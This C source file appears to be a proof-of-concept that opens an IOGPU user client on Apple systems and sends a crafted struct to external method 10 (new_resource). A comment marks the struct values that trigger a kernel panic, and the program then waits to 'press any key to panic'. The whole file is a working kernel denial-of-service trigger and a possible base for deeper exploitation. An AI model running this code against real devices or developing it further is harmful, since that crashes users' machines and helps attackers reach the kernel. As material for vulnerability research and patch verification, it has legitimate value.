#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#include <mach-o/dyld.h>
#include <mach/mach.h>

#include "iokit.h"

kern_return_t mach_vm_protect (
  vm_map_t target_task,
  mach_vm_address_t address,
  mach_vm_size_t size,
  boolean_t set_maximum,
  vm_prot_t new_protection);

const int IOGPUDeviceUserClient_init_type = 5;

// An IOGPUUserClient instance.
mach_port_t IOGPUUserClient;

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", &data, i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else
            ascii[i % 16] = '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0)
                printf("|  %s \n", ascii);
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");

                printf("|  %s \n", ascii);
            }
        }
    }
}

kern_return_t
IOGPU_new_resource(void) {

    uint8_t struct_input[0x400] = {0};

    *(uint64_t *)struct_input = 3;  //call IOGPUResource::newResourceGroup
    *(uint64_t *)(struct_input + 0x8) = 0;
    *(uint64_t *)(struct_input + 0x10) = 0;
    *(uint64_t *)(struct_input + 0x18) = 0;
    *(uint64_t *)(struct_input + 0x20) = 0;
    *(uint64_t *)(struct_input + 0x28) = 0;
    *(uint64_t *)(struct_input + 0x30) = 0;
    *(uint32_t *)(struct_input + 0x34) = 0;
    *(uint32_t *)(struct_input + 0x38) = 0x1;    //trigger panic if 1, 2, 4, 8, 0x10 or 0x20

    uint8_t struct_output[0x400] = {0};
    size_t struct_output_sz = sizeof(struct_output);

    kern_return_t kr = IOConnectCallMethod(
        IOGPUUserClient,
        10, // s_new_resource
        0, 0,
        struct_input, sizeof(struct_input),
        0, 0,
        struct_output, &struct_output_sz
    );

	if (kr != KERN_SUCCESS) {
		printf("[-] failed to %s value in %s: 0x%x\n", "new_resource", "IOGPU", kr);
    }

    // hexdump(struct_output, 0x100);

    // uint64_t mem = *(uint64_t *)(struct_output + 0x10);
    // printf("mem = 0x%llx\n", mem);

    // getchar();
    // hexdump((uint64_t*)mem, 0x100);

	return kr;
}



int main(int argc, char *argv[], char *envp[]) {
    kern_return_t kr;

    io_service_t IOGPU = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGPU"));
    printf("IOGPU = 0x%llx\n", IOGPU);

    //__ZN5IOGPU13newUserClientEP4taskPvjPP12IOUserClient
    IOGPUUserClient = MACH_PORT_NULL;
	kr = IOServiceOpen(IOGPU, mach_task_self(), IOGPUDeviceUserClient_init_type, &IOGPUUserClient);
    printf("IOGPUUserClient = 0x%llx\n", IOGPUUserClient);

    kr = IOGPU_new_resource();
    printf("IOGPU_new_resource kr = 0x%llx\n", kr);

    puts("press any key to panic\n");

    getchar();

    return 0;
}